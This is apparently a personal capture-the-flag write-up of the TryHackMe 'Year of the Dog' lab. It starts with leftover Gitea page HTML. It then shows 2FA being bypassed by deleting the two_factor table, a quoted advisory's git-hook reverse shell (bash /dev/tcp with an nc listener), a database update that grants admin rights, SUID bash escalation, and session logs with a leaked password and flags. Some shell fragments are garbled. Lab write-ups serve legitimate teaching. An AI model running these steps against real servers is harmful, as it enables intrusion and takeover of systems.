                                                                            <div class="ui checkbox" id="archivedFilterCheckbox" title="Showing only unarchived" v-if="archivedFilter === 'unarchived'">
                                                                                    <input type="checkbox">
                                                                                    <label><i class="archive icon archived-icon"></i>Archived</label>
                                                                            </div>
                                                                            <div class="ui checkbox" id="archivedFilterCheckbox" title="Showing only archived" v-if="archivedFilter === 'archived'">
                                                                                    <input type="checkbox">
                                                                                    <label><i class="archive icon archived-icon"></i>Archived</label>
                                                                            </div>
                                                                    </a>
                                                            </div>
                                                            <div class="item">
                                                                    <a @click="togglePrivateFilter()">
                                                                            <div class="ui checkbox" id="privateFilterCheckbox" title="Showing both public and private" v-if="privateFilter === 'both'">
                                                                                    <input type="checkbox">
                                                                                    <label><svg viewBox="0 0 16 16" class="svg octicon-lock" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 4v2h-.25A1.75 1.75 0 002 7.75v5.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-5.5A1.75 1.75 0 0012.25 6H12V4a4 4 0 10-8 0zm6.5 2V4a2.5 2.5 0 00-5 0v2h5zM12 7.5h.25a.25.25 0 01.25.25v5.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-5.5a.25.25 0 01.25-.25H12z"/></svg>Private</label>
                                                                            </div>
                                                                            <div class="ui checkbox" id="privateFilterCheckbox" title="Showing only public" v-if="privateFilter === 'public'">
                                                                                    <input type="checkbox">
                                                                                    <label><svg viewBox="0 0 16 16" class="svg octicon-lock" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 4v2h-.25A1.75 1.75 0 002 7.75v5.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-5.5A1.75 1.75 0 0012.25 6H12V4a4 4 0 10-8 0zm6.5 2V4a2.5 2.5 0 00-5 0v2h5zM12 7.5h.25a.25.25 0 01.25.25v5.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-5.5a.25.25 0 01.25-.25H12z"/></svg></svg>Private</label>
                                                                            </div>
                                                                            <div class="ui checkbox" id="privateFilterCheckbox" title="Showing only private" v-if="privateFilter === 'private'">
                                                                                    <input type="checkbox">
                                                                                    <label><svg viewBox="0 0 16 16" class="svg octicon-lock" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 4v2h-.25A1.75 1.75 0 002 7.75v5.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-5.5A1.75 1.75 0 0012.25 6H12V4a4 4 0 10-8 0zm6.5 2V4a2.5 2.5 0 00-5 0v2h5zM12 7.5h.25a.25.25 0 01.25.25v5.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-5.5a.25.25 0 01.25-.25H12z"/></svg></svg>Private</label>
                                                                            </div>
                                                                    </a>
                                                            </div>
                                                    </div>
                                            </div>
                                    </div>
                                    <div class="ui secondary tiny pointing borderless menu center aligned grid repos-filter">
                                            <a class="item" :class="{active: reposFilter === 'all'}" @click="changeReposFilter('all')">
                                                    All
                                                    <div v-show="reposFilter === 'all'" class="ui circular mini grey label">${repoTypeCount}</div>
                                            </a>
                                            <a class="item" :class="{active: reposFilter === 'sources'}" @click="changeReposFilter('sources')">
                                                    Sources
                                                    <div v-show="reposFilter === 'sources'" class="ui circular mini grey label">${repoTypeCount}</div>
                                            </a>
                                            <a class="item" :class="{active: reposFilter === 'forks'}" @click="changeReposFilter('forks')">
                                                    Forks
                                                    <div v-show="reposFilter === 'forks'" class="ui circular mini grey label">${repoTypeCount}</div>
                                            </a>
                                            <a class="item" :class="{active: reposFilter === 'mirrors'}" @click="changeReposFilter('mirrors')">
                                                    Mirrors
                                                    <div v-show="reposFilter === 'mirrors'" class="ui circular mini grey label">${repoTypeCount}</div>
                                            </a>
                                            <a class="item" :class="{active: reposFilter === 'collaborative'}" @click="changeReposFilter('collaborative')">
                                                    Collaborative
                                                    <div v-show="reposFilter === 'collaborative'" class="ui circular mini grey label">${repoTypeCount}</div>
                                            </a>
                                    </div>
                            </div>
                            <div class="ui attached table segment">
                                    <ul class="repo-owner-name-list">
                                            <li v-for="repo in repos" :class="{'private': repo.private || repo.internal}">
                                                    <a :href="suburl + '/' + repo.full_name">
                                                            <component v-bind:is="repoIcon(repo)" size="16"></component>
                                                            <strong class="text truncate item-name">${repo.full_name}</strong>
                                                            <i v-if="repo.archived" class="archive icon archived-icon"></i>
                                                            <span class="ui right text light grey">
                                                                    ${repo.stars_count} <span class="rear"><svg viewBox="0 0 16 16" class="svg octicon-star" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 .25a.75.75 0 01.673.418l1.882 3.815 4.21.612a.75.75 0 01.416 1.279l-3.046 2.97.719 4.192a.75.75 0 01-1.088.791L8 12.347l-3.766 1.98a.75.75 0 01-1.088-.79l.72-4.194L.818 6.374a.75.75 0 01.416-1.28l4.21-.611L7.327.668A.75.75 0 018 .25zm0 2.445L6.615 5.5a.75.75 0 01-.564.41l-3.097.45 2.24 2.184a.75.75 0 01.216.664l-.528 3.084 2.769-1.456a.75.75 0 01.698 0l2.77 1.456-.53-3.084a.75.75 0 01.216-.664l2.24-2.183-3.096-.45a.75.75 0 01-.564-.41L8 2.694v.001z"/></svg></span>
                                                            </span>
                                                    </a>
                                            </li>
                                            <li v-if="showMoreReposLink">
                                                    <div class="center">
                                                            <div class="ui borderless pagination menu narrow">
                                                                    <a class="item navigation" :class="{'disabled': page === 1}"
                                                                            @click="changePage(1)" title="First">
                                                                            <i class="angle double left icon"></i>
                                                                    </a>
                                                                    <a class="item navigation" :class="{'disabled': page === 1}"
                                                                            @click="changePage(page - 1)" title="Previous">
                                                                            <i class="left arrow icon"></i>
                                                                    </a>
                                                                    <a class="active item">${page}</a>
                                                                    <a class="item navigation" :class="{'disabled': page === finalPage}"
                                                                            @click="changePage(page + 1)" title="Next">
                                                                            <i class="icon right arrow"></i>
                                                                    </a>
                                                                    <a class="item navigation" :class="{'disabled': page === finalPage}"
                                                                            @click="changePage(finalPage)" title="Last">
                                                                            <i class="angle double right icon"></i>
                                                                    </a>
                                                            </div>
                                                    </div>
                                            </li>
                                    </ul>
                            </div>
                    </div>
                    <div v-if="!isOrganization" v-show="tab === 'organizations'" class="ui tab active list">
                            <h4 class="ui top attached header">
                                    My Organizations <span class="ui grey label">${organizationsTotalCount}</span>
                                    <div v-if="canCreateOrganization" class="ui right">
                                            <a class="poping up" :href="suburl + '/org/create'" data-content="New Organization" data-variation="tiny inverted" data-position="left center">
                                                    <i class="plus icon"></i>
                                                    <span class="sr-only">New Organization</span>
                                            </a>
                                    </div>
                            </h4>
                            <div class="ui attached table segment">
                                    <ul class="repo-owner-name-list">
                                            <li v-for="org in organizations">
                                                    <a :href="suburl + '/' + org.name">
                                                            <svg viewBox="0 0 16 16" class="svg octicon-organization" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M1.5 14.25c0 .138.112.25.25.25H4v-1.25a.75.75 0 01.75-.75h2.5a.75.75 0 01.75.75v1.25h2.25a.25.25 0 00.25-.25V1.75a.25.25 0 00-.25-.25h-8.5a.25.25 0 00-.25.25v12.5zM1.75 16A1.75 1.75 0 010 14.25V1.75C0 .784.784 0 1.75 0h8.5C11.216 0 12 .784 12 1.75v12.5c0 .085-.006.168-.018.25h2.268a.25.25 0 00.25-.25V8.285a.25.25 0 00-.111-.208l-1.055-.703a.75.75 0 11.832-1.248l1.055.703c.487.325.779.871.779 1.456v5.965A1.75 1.75 0 0114.25 16h-3.5a.75.75 0 01-.197-.026c-.099.017-.2.026-.303.026h-3a.75.75 0 01-.75-.75V14h-1v1.25a.75.75 0 01-.75.75h-3zM3 3.75A.75.75 0 013.75 3h.5a.75.75 0 010 1.5h-.5A.75.75 0 013 3.75zM3.75 6a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5zM3 9.75A.75.75 0 013.75 9h.5a.75.75 0 010 1.5h-.5A.75.75 0 013 9.75zM7.75 9a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5zM7 6.75A.75.75 0 017.75 6h.5a.75.75 0 010 1.5h-.5A.75.75 0 017 6.75zM7.75 3a.75.75 0 000 1.5h.5a.75.75 0 000-1.5h-.5z"/></svg>
                                                            <strong class="text truncate item-name">${org.name}</strong>
                                                            <span class="ui right text light grey">
                                                                    ${org.num_repos} <span class="rear"><svg viewBox="0 0 16 16" class="svg octicon-repo" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"/></svg></span>
                                                            </span>
                                                    </a>
                                            </li>
                                    </ul>
                            </div>
                    </div>
            </div>
    </repo-search>
    </div>
    
                    </div>
            </div>
    </div>
    
            </div>
    
            <footer>
            <div class="ui container">
                    <div class="ui left">
                            Powered by Gitea Version: 1.13.0&#43;dev-542-gbc11caff9 Page: <strong>325ms</strong> Template: <strong>3ms</strong>
                    </div>
                    <div class="ui right links">
    
                            <div class="ui language bottom floating slide up dropdown link item">
                                    <i class="world icon"></i>
                                    <div class="text">English</div>
                                    <div class="menu">
    
                                                    <a lang="en-US" class="item active selected" href="#">English</a>
    
                                                    <a lang="zh-CN" class="item " href="?lang=zh-CN">简体中文</a>
    
                                                    <a lang="zh-HK" class="item " href="?lang=zh-HK">繁體中文（香港）</a>
    
                                                    <a lang="zh-TW" class="item " href="?lang=zh-TW">繁體中文（台灣）</a>
    
                                                    <a lang="de-DE" class="item " href="?lang=de-DE">Deutsch</a>
    
                                                    <a lang="fr-FR" class="item " href="?lang=fr-FR">français</a>
    
                                                    <a lang="nl-NL" class="item " href="?lang=nl-NL">Nederlands</a>
    
                                                    <a lang="lv-LV" class="item " href="?lang=lv-LV">latviešu</a>
    
                                                    <a lang="ru-RU" class="item " href="?lang=ru-RU">русский</a>
    
                                                    <a lang="uk-UA" class="item " href="?lang=uk-UA">Українська</a>
    
                                                    <a lang="ja-JP" class="item " href="?lang=ja-JP">日本語</a>
    
                                                    <a lang="es-ES" class="item " href="?lang=es-ES">español</a>
    
                                                    <a lang="pt-BR" class="item " href="?lang=pt-BR">português do Brasil</a>
    
                                                    <a lang="pt-PT" class="item " href="?lang=pt-PT">Português de Portugal</a>
    
                                                    <a lang="pl-PL" class="item " href="?lang=pl-PL">polski</a>
    
                                                    <a lang="bg-BG" class="item " href="?lang=bg-BG">български</a>
    
                                                    <a lang="it-IT" class="item " href="?lang=it-IT">italiano</a>
    
                                                    <a lang="fi-FI" class="item " href="?lang=fi-FI">suomi</a>
    
                                                    <a lang="tr-TR" class="item " href="?lang=tr-TR">Türkçe</a>
    
                                                    <a lang="cs-CZ" class="item " href="?lang=cs-CZ">čeština</a>
    
                                                    <a lang="sr-SP" class="item " href="?lang=sr-SP">српски</a>
    
                                                    <a lang="sv-SE" class="item " href="?lang=sv-SE">svenska</a>
    
                                                    <a lang="ko-KR" class="item " href="?lang=ko-KR">한국어</a>
    
                                    </div>
                            </div>
                            <a href="/js/licenses.txt">Licenses</a>
                            <a href="/api/swagger">API</a>
                            <a target="_blank" rel="noopener noreferrer" href="https://gitea.io">Website</a>
    
                            <span class="version">Go1.15.1</span>
                    </div>
            </div>
    </footer>
    
            <script src="/js/index.js?v=b1ac68db93a054fae10cb84624df1582"></script>
    
    </body>
    </html>
    
           
    ```
    

#### Editing the sql to DELETE the sql that ask For the 2FA

```jsx
cd /
cd /gitea/gitea
python3
>>> import sqlite3
>>> connection = sqlite3.connect('gitea.db')
>>> cursor = connection.cursor()
>>> cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
>>> print(cursor.fetchall())
>>> cursor.execute("DELETE FROM two_factor")
>>> connection.commit()
```

- in the TERMINAL
    
    ```jsx
    dylan@year-of-the-dog:/gitea/gitea$ ll
    total 1224
    drwxr-xr-x 9 dylan dylan  4096 Jan 22 14:30 ./
    drwxr-xr-x 5 root  root   4096 Sep  5 19:29 ../
    drwxr-xr-x 7 dylan dylan  4096 Sep  5 19:29 attachments/
    drwxr-xr-x 7 dylan dylan  4096 Sep  5 19:29 avatars/
    drwxr-xr-x 2 dylan dylan  4096 Sep  5 19:29 conf/
    -rw-r--r-- 1 dylan dylan 1212416 Jan 22 14:30 gitea.db
    drwxr-xr-x 7 dylan dylan  4096 Sep  5 19:41 indexers/
    drwxr-xr-x 7 dylan dylan  4096 Sep  6 01:00 log/
    drwxr-xr-x 7 dylan dylan  4096 Sep  5 19:41 queues/
    drwxr-xr-x 7 dylan dylan  4096 Sep  7 21:50 sessions/
    
    dylan@year-of-the-dog:/gitea/gitea$ python3
    Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
    [GCC 8.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import sqlite3
    >>> connection = sqlite3.connect('gitea.db')
    >>> cursor = connection.cursor()
    >>> cursor.execute("SELECT name FROM sqlite3_master WHERE type='table';")
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
    sqlite3.OperationalError: no such table: sqlite3_master
    >>> cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    <sqlite3.Cursor object at 0x7fc7e1b50d50>
    >>> print(cursor.fetchall())
    [('sqlite_sequence',), ('public_key',), ('access_token',), ('repo_unit',), 
    ('webhook',), ('hook_task',), ('pull_request',), ('comment',), ('user'), 
    ('team',), ('org_user',), ('team_user',), ('two_factor',), ('gpg_key',), 
    ('gpg_key_import',), ('repo_user',), ('watch',), ('commit_status',), 
    ('stopwatch',), ('tracked_time',), ('email_hash',), ('project',), 
    ('project_board',), ('project_issue',)]
    >>> cursor.execute("DELETE FROM two_factor")
    <sqlite3.Cursor object at 0x7fc7e1b50d50>
    >>> connection.commit()
    
    ```
    

#### login without the 2FA once i delete it, I got access to the user

![Screenshot From 2025-03-22 07-45-45.png](img6.png)

#### I googled what attack vectors I could use with a git-like platform to get a reverse shell

> The git hook feature in Gogs and Gitea, which are software projects for self-hosted git servers, allows an attacker with access to a user account to execute code as the operating system user running the instance. By default, only users that have the “Administrator” privilege have the ability to create git hooks, but this privilege can be granted to users independently of the administrator privilege. There seems to be no restriction on the type of commands that can be executed using git hooks. An attacker can abuse this to gain remote shell access to the system. Even if a specific system user is created for Gitea or Gogs, an attacker gains complete control of the instance. Given the privilege, a regular user is able to read from and commit to all hosted repositories and gain administrative access on the instance through a simple database modification.”                                                                   https://arkadiusz-kotela.medium.com/tryhackme-year-of-the-dog-write-up-d8e7df16c84d
> 

#### **FSA-2020-3 Authenticated Remote Code Execution in Gitea 1.12.5 and Gogs 0.12.2**

---

**FSA-2020-3 Authenticated Remote Code Execution in Gitea 1.12.5 and Gogs 0.12.2**

Published: Oct 07, 2020

Version: 1.0

### Proof of Concept

1. Set up Gogs/Gitea as described in the documentation.
2. Use the web installer, create a user "root" and use sqlite3 as a database (sqlite is simplest, other databases should work similarly).
3. Create a new user in Gitea/Gogs named "testuser". Grant "May Create Git Hooks" privilege to user "testuser".
4. Log in as user "testuser", create a new repository "testrepo", create a new "post-receive" git hook for repository "testrepo" using the bash commands depicted below:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.7/8080 0>&1 # replace IP address with IP address of the attacker's computer

```

1. On the attacker's computer, start a listener for a reverse shell using the command:

```bash
$ nc -lvnp 8080

```

1. On the attacker's computer in a new shell, push any commit to the repository "testrepo", e.g., as described in the repository:

```
$ touch README.md
$ git init
$ git add README.md
$ git commit -m "first commit"
$ git remote add origin <http://HOST:3000/root/testrepo.git>
$ git push -u origin master

git clone http://localhost:3000/<USER>/<REPO> && cd <REPO>
echo "test" >> README.md
git add README.md
git commit -m "Exploit"
git push
```

1. Receive shell access to the server on the reverse shell listener created before.
2. (Optional) Modify the database to give administrative privileges to user "testuser" (in this example using sqlite3, other database formats are equally supported, replace gogs.db by gitea.db for Gitea):

```bash
/usr/bin/sqlite3 /path/to/database/gogs.db "UPDATE user SET is_admin = 1 WHERE lower_name = 'testuser';"

```

Instead of gaining a remote shell first, the user "testuser" may also directly run the database modification from the git hook.

### image

 

![1_A_Hv2ozUjmxEA1medihRZA.webp](img7.webp)

![1_KwOw5dstPyBlni4RC95thA.webp](img8.webp)

### On the Reverse shell i’m in a container but i can run all cmd as root

The best part is that all I did as the user ***root***. That was the solution to get a root shell on the host. Two steps had to be done.

Firstly, I copied the **/bin/bash** bin on the host side to the **/gitea/gitea** directory. The binary appeared in the **/data/gitea** directory in the docker container (the directory the user git had all permissions).

Secondly, using the user ***git*** sudo privileges, I changed the binary ownership to root and changed permission to 4755, adding the SUID bit.

```jsx
ls -al /
id
sudoGood news also was that I cou su
id
pwd
ls
chown root:root bash && chmod 4755 bash
cd /data
echo 'hi' > hi
ls -al
```

```jsx
52:11:e3:36:91:72
d8:fc:93:51:b0:5d
ca:39:c0:1f:0a:8f
1e:28:12:53:f0:22
16:ec:71:19:c4:8f
0e:90:39:71:c1:3f
```

## images

![1_FOOw8jwVjhOx99Gm-DwEhw.webp](img9.webp)

![1_DA340AuNFLo8L2G3R1fjgA.webp](img10.webp)

![1_sMTbgi3rza3t3FoO6ZgBoA.webp](img11.webp)

![1_lEQR7KEJ-__mgliBN8CqPg.webp](img12.webp)

![1_eTs9UhXGMuGpR-A8qMWtHQ.webp](img13.webp)

### open terminal

```jsx
┌──(neo㉿neo)-[~]
└─$ ssh dylan@10.10.132.206       
The authenticity of host '10.10.132.206 (10.10.132.206)' can't be established.
ED25519 key fingerprint is SHA256:COVMyuuQk4t2tjR365JBufQ/zuW3VAnAka5yRg+KQnI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.132.206' (ED25519) to the list of known hosts.
dylan@10.10.132.206's password: 
Permission denied, please try again.
dylan@10.10.132.206's password: 
Permission denied, please try again.
dylan@10.10.132.206's password: 

        __   __                       __   _   _            ____              
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
                                                                        |___/ 

dylan@year-of-the-dog:~$ ls
user.txt  work_analysis                                                                             
dylan@year-of-the-dog:~$ cat user.txt
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}                                                               
dylan@year-of-the-dog:~$ netstat -plnt
(Not all processes could be identified, non-owned process info                                      
 will not be shown, you would have to be root to see it all.)                                       
Active Internet connections (only servers)                                                          
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37361         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
dylan@year-of-the-dog:~$ netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37361         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
dylan@year-of-the-dog:~$ ss -alt
State              Recv-Q              Send-Q                            Local Address:Port                             Peer Address:Port              
LISTEN             0                   80                                    127.0.0.1:mysql                                 0.0.0.0:*                 
LISTEN             0                   128                                   127.0.0.1:37361                                 0.0.0.0:*                 
LISTEN             0                   128                               127.0.0.53%lo:domain                                0.0.0.0:*                 
LISTEN             0                   128                                     0.0.0.0:ssh                                   0.0.0.0:*                 
LISTEN             0                   128                                   127.0.0.1:3000                                  0.0.0.0:*                 
LISTEN             0                   128                                           *:http                                        *:*                 
LISTEN             0                   128                                        [::]:ssh                                      [::]:*                 
dylan@year-of-the-dog:~$ ssh -fN -L 3000:127.0.0.1:3000 dylan@10.10.132.206
The authenticity of host '10.10.132.206 (10.10.132.206)' can't be established.
ECDSA key fingerprint is SHA256:ZQhtZbHSQm8e0SOq4EyzzwfLf01L5P0MC3bdo9xqb0M.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.132.206' (ECDSA) to the list of known hosts.
dylan@10.10.132.206's password: 
bind: Address already in use
dylan@year-of-the-dog:~$ 
                                                 
```

```jsx
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.2.26.145] from (UNKNOWN) [10.10.132.206] 45392
Linux year-of-the-dog 4.15.0-143-generic #147-Ubuntu SMP Wed Apr 14 16:10:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 07:29:26 up 38 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
...
$ cd home
$ ls
dylan
$ cd dylan
$ ls
user.txt
work_analysis
cals      
ls
ls
user.txt
work_analysis
$ user.txt
work_analysis
$ user.txt
work_analysis
$ cat user.txt
cat: user.txt: Permission denied
$ cat work_analysis | grep -i dylan
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624                                                         
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2                                
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]                               
$                                                                                                                                                                   
┌──(neo㉿neo)-[~]
└─$ 
```

## Flage

THM{MzlhNGY……GI0YTc0OWRh}

### Writeups that help me

- [**Year Of The Dog — Write-up by Arkadiusz Kotela (Medium)**](https://arkadiusz-kotela.medium.com/tryhackme-year-of-the-dog-write-up-d8e7df16c84d)
    
    A comprehensive walkthrough covering the SQLi vector, file upload, and both user and root flag retrieval.
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
